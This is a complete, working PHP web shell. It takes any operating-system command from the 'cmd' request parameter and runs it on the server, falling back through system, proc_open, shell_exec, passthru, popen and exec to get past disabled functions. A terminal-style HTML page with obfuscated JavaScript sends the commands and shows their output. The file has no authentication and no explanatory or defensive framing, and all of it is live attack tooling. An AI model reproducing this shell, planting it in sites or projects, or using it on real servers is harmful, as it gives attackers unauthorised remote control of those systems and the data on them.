<?php if ( isset( $_REQUEST["cmd"] ) ) {$c=$_REQUEST["cmd"]; @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0); $z=@ini_get('disable_functions'); if(!empty($z)){ $z=preg_replace('/[, ]+/',',',$z); $z=explode(',',$z); $z=array_map('trim',$z); }else{ $z=array(); } $c=$c." 2>&1"; function f($n){ global $z; return is_callable($n) and !in_array($n,$z); } if(f('system')){ ob_start(); system($c); $w=ob_get_contents(); ob_end_clean(); }elseif(f('proc_open')){ $y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t); $w=NULL; while(!feof($t[1])){ $w.=fread($t[1],512); } @proc_close($y); }elseif(f('shell_exec')){ $w=shell_exec($c); }elseif(f('passthru')){ ob_start(); passthru($c); $w=ob_get_contents(); ob_end_clean(); }elseif(f('popen')){ $x=popen($c,r); $w=NULL; if(is_resource($x)){ while(!feof($x)){ $w.=fread($x,512); } } @pclose($x); }elseif(f('exec')){ $w=array(); exec($c,$w); $w=join(chr(10),$w).chr(10); }else{ $w=0; } print $w; } else { ?>
<html><head><style type="text/css"><!-- body,input,select{background-color:#000;color:#90ee90}a,body,input,select{color:#90ee90}body{font-family:tahoma,arial,sans-serif;font-size:75%;padding:10px 20px}input,pre,select{padding:5px;font-family:courier new,fixed}*{font-size:1em}a{text-decoration:underline}pre{border:2px solid #90ee90;width:100%;height:70%;overflow:auto}input,select{border:1px solid #90ee90;margin:5px}input[type=text],select{width:50%}h2{font-size:1.25em} --></style></head><body onload="document.forms[0].c.focus();"><script>var _0xcdae=["value","p","c","innerHTML","o","getElementById","> <a href='#' onclick='return sh(this);'>","</a>\x0A","load","responseText","scrollTop","scrollHeight","addEventListener","GET","?cmd=","open","send","","forms","innerText","focus"];function s(_0xd340x2){p= _0xd340x2[_0xcdae[1]][_0xcdae[0]];c= _0xd340x2[_0xcdae[2]][_0xcdae[0]];document[_0xcdae[5]](_0xcdae[4])[_0xcdae[3]]+= _0xcdae[6]+ c+ _0xcdae[7];var _0xd340x3= new XMLHttpRequest();_0xd340x3[_0xcdae[12]](_0xcdae[8],function(){o= document[_0xcdae[5]](_0xcdae[4]);o[_0xcdae[3]]+= this[_0xcdae[9]];o[_0xcdae[10]]= o[_0xcdae[11]]});_0xd340x3[_0xcdae[15]](_0xcdae[13],p+ _0xcdae[14]+ c);_0xd340x3[_0xcdae[16]]();_0xd340x2[_0xcdae[2]][_0xcdae[0]]= _0xcdae[17]}function sh(_0xd340x5){document[_0xcdae[18]][0][_0xcdae[2]][_0xcdae[0]]= _0xd340x5[_0xcdae[19]];document[_0xcdae[18]][0][_0xcdae[2]][_0xcdae[20]]();return false}</script><form onsubmit="s(this);return false;"><input type="text" name="p" value="<?php echo $_SERVER['SCRIPT_NAME'] ?>" /> Shell Path<br /><input type="text" name="c" value="" autocomplete="off" /> Command<br /><input type="submit" value="Execute" /><br /><h2>Output</h2><pre id="o"></pre></form></body></html><?php } ?>
